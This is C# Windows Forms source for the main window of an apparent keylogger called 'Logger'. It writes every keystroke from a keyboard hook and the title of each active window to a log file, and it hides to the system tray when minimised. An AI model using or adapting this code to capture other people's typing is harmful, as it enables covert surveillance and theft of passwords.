using System;
using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;
using System.ComponentModel;
using System.IO;
using System.Text;

namespace Logger
{
	public partial class MainForm : Form
	{
		public string cWin = null;
		public static string nl = Environment.NewLine;

		public MainForm()
		{
			InitializeComponent();
		}
		
		public static DialogResult AskOverwrite()
		{
			DialogResult result = MessageBox.Show("Log already exists. Overwrite?", 
				"Overwrite?", 
				MessageBoxButtons.YesNo, 
				MessageBoxIcon.Question);
				
			return result;
		}

		private void MainForm_Resize(object sender, EventArgs e)
		{
		
		     if (FormWindowState.Minimized == this.WindowState)
		     {
		          systray.Visible = true;
		          this.Hide();    
		     }
		     else if (FormWindowState.Normal == this.WindowState)
		     {
		          systray.Visible = false;
		     }
		}

		private void SystrayMouse_DoubleClick(object sender, MouseEventArgs e)
		{
			this.Show();
     		this.WindowState = FormWindowState.Normal;
		}

		private void HookManager_KeyPress(object sender, KeyPressEventArgs e)
		{
			if (Program.run)
			{
				output.AppendText(string.Format(e.KeyChar.ToString()));
				File.AppendAllText(Program.file, e.KeyChar.ToString());
			}
		}
		
		private void Start_Click(object sender, EventArgs e)
		{
			if (!Program.run)
			{
				if (File.Exists(Program.file))
				{
					if (AskOverwrite() == DialogResult.Yes)
					{
						File.WriteAllText(Program.file, "");
					}
				}
				else
				{
					File.WriteAllText(Program.file, "");
				}
			
				Program.run = true;
				output.AppendText(string.Format("Logging started - {1}{0}", nl, System.DateTime.Now));
				File.AppendAllText(Program.file, string.Format("Logging started - {1}{0}", nl, System.DateTime.Now));
			}
			else
			{
				output.AppendText(string.Format("Logging already started!{0}", nl));
			}
		}
		
		private void Stop_Click(object sender, EventArgs e)
		{
			if (Program.run)
			{
				Program.run = false;
				output.AppendText(string.Format("{0}Logging stopped - {1}{0}", nl, System.DateTime.Now));
				File.AppendAllText(Program.file, string.Format("{0}Logging stopped - {1}{0}", nl, System.DateTime.Now));
			}
			else
			{
				output.AppendText(string.Format("Logging already stopped!{0}", nl));
			}
		}

		private void getWindowTimer_Tick(object sender, EventArgs e)
		{
			if (cWin != CurrentWindow.GetActiveWindow() && Program.run)
			{
				cWin = CurrentWindow.GetActiveWindow();
				if (cWin != null)
				{
					output.AppendText(string.Format("{0}Window - {1}{0}", nl, cWin));
					File.AppendAllText(Program.file, string.Format("{0}Window - {1}{0}", nl, cWin));
				}
			}
		}
	}
}
